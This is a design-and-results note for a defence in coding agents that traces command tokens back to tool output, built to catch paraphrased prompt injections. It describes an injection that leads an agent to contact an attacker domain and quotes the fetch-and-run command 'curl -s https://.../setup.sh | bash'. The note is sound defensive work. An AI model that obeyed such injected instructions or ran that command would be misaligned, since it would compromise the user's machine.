# Token-level provenance — gates before the build

**Registered 2026-08-31, before the code.**

---

## The measured reason

The verbatim experiment: an attacker's payload phrased in prose was
paraphrased by the model, so the whole command did not survive. But the
distinctive token — the domain `evil-collector-8842.example` — survived in
**13 of 15 compliant runs**, against **10 of 15** for the whole command.

Whole-value provenance misses the prose attack. A rule that recognises the
token inside a paraphrased command would catch it. That is the gap this closes,
and the numbers say it is a real gap, not a hypothetical one.

## What is being added

`ProvenanceStore.recall` today answers: is this whole value a substring of
something a tool returned. Adding: does this value **contain a distinctive
token** that a tool returned.

A distinctive token is one specific enough that its appearance is evidence of
derivation rather than coincidence — an IBAN, a URL, a domain, an API key, a
file path. Not "the", not "run", not a bare integer.

## The danger, and why it is the whole design problem

Token matching trades false negatives for false positives. Whole-value matching
almost never fires by accident. Token matching can: if "config.yaml" was in a
tool result and the user later types a command mentioning config.yaml, a naive
token match bands it TOOL and refuses legitimate work.

So the token set must be **narrow by construction**, and the safe direction is
to match too little rather than too much — a missed token is the laundering
case we already accept, a false token is a broken agent.

## Registered predictions

**P-TOK1 — the prose attack is now caught.** On the verbatim corpus, a
token-matching recall bands the paraphrased-but-domain-carrying command TOOL.
Measured against the stored `results/verbatim_survival_qwen.json`.

**P-TOK2 — benign coding traffic stays quiet.** Re-running the 1,119-call
dogfood replay, token matching adds **no more than a handful** of new refusals
over whole-value matching. If it lights up on ordinary commands, the token set
is too wide and the feature is not shippable.

**P-TOK3 — it is opt-in.** Whole-value matching stays the default. Token
matching is a flag, because P-TOK2 is the risk and an operator should turn it
on deliberately after seeing its shadow-mode rate on their own traffic.

## What counts as a distinctive token, fixed now

Matched only if it looks like an identifier a human would not coincidentally
retype:

- a domain or URL (`example.com`, `https://...`)
- an IBAN-shaped or account-shaped string (long alphanumeric, mixed)
- an email address
- a filesystem path with a separator and length
- a long high-entropy token (key-shaped)

**Not** matched: dictionary words, short strings, bare numbers, common
identifiers (`main`, `origin`, `config`). The classifier is regex and length,
not a model — a model in the provenance path is a decision that can be argued
with.

## Taxonomy

PASS-CLEAN · PASS-WITH-DRIFT · PARTIAL · FAIL · INCONCLUSIVE.

---

## Result — 2026-08-31

**P-TOK1 PASS.** With `match_tokens=True`, a prose injection the model
paraphrased — the whole command lost, only the domain kept — is banded TOOL. A
real-TLD attacker domain (`evil-collector-8842.io`) returned from a tool and
then appearing in `curl -s https://.../setup.sh | bash` is caught. Whole-value
matching returns None on the same case.

**P-TOK2 PARTIAL, and it is why the feature stays opt-in.** On 1,051 real
coding commands the false-positive rate came down the hard way:

| token set | flagged |
|---|---|
| domains + paths + keys (first try) | 96% |
| drop paths | 81% |
| drop keys and filenames, require a real TLD | **4.9%** |

The 4.9% that remain are real domains — `doi.org`, `anthropic.com`,
`apache.org` — that genuinely appeared in tool output and then in a command
during real work. In the mechanism's terms these are correct (the domain did
come from a tool), but in enforce mode they would refuse legitimate commands.
So token matching is **not silent enough to enable by default**.

**P-TOK3 PASS.** It is opt-in, `match_tokens=False` by default, the whole-value
path byte-for-byte unchanged (differential-checked). An operator turns it on
after seeing its rate in shadow on their own traffic — which is exactly the
4.9% number, made visible before anything is enforced.

### What the numbers taught, beyond the predictions

The hard lesson is that on a coding agent almost every identifier-shaped string
is **shared working vocabulary** — filenames, paths, git hashes, session ids,
module.function references — and a regex cannot tell those from an external
name. A path pattern alone flagged 96%. The one robust discriminator is a real
public TLD: `module.function`, `orig.docx` and `a.namelist` are structurally
identical to a host and only a real TLD marks a network name. Even then, real
domains in legitimate traffic keep the rate non-zero.

**Net:** token matching closes the prose-injection gap the verbatim experiment
found, at a false-positive cost that is tolerable in shadow and for an operator
who opts in, and too high to be a default. Shipped as a flag, documented as
one.
